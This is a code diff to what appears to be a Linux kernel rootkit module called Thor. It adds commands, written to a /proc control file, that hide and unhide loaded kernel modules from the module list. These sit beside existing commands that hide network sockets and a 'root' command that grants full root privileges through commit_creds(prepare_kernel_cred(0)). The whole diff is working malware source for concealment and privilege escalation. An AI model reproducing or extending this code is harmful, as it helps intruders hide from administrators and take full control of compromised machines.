@@ -5,6 +5,7 @@
 #include "logging.h"
 #include "prochider.h"
 #include "sockethider.h"
+#include "lsmodhider.h"
 
 #include <linux/module.h>
 #include <linux/proc_fs.h>
@@ -66,6 +67,9 @@ static int procfile_read(struct seq_file *m, void *v)
         "   echo hu6s PORT > /proc/" THOR_PROCFILE " (hide udp6 socket)\n"\
         "   echo uu6s PORT > /proc/" THOR_PROCFILE " (unhide udp6 socket)\n"\
         "   echo uu6a > /proc/" THOR_PROCFILE " (unhide all udp6 sockets)\n"\
+        "   echo hm MODULE > /proc/" THOR_PROCFILE " (hide module)\n"\
+        "   echo um MODULE > /proc/" THOR_PROCFILE " (unhide module)\n"\
+        "   echo uma > /proc/" THOR_PROCFILE " (unhide all modules)\n"\
         "   echo root > /proc/" THOR_PROCFILE " (gain root privileges)\n");
     return 0;
 }
@@ -157,6 +161,12 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
         remove_from_udp6_list((int) port);
     } else if(strncmp(buffer, "uu6a", MIN(4, count)) == 0) {
         clear_udp6_list();
+    } else if (strncmp(buffer, "hm ", MIN(3, count)) == 0) {
+        add_to_module_list(buffer + 3, count - 3);
+    } else if (strncmp(buffer, "uma", MIN(3, count)) == 0) {
+        clear_module_list();
+    } else if (strncmp(buffer, "um ", MIN(3, count)) == 0) {
+        remove_from_module_list(buffer + 3, count - 3);
     } else if (strncmp(buffer, "root", MIN(4, count)) == 0) {
         commit_creds(prepare_kernel_cred(0));
     }
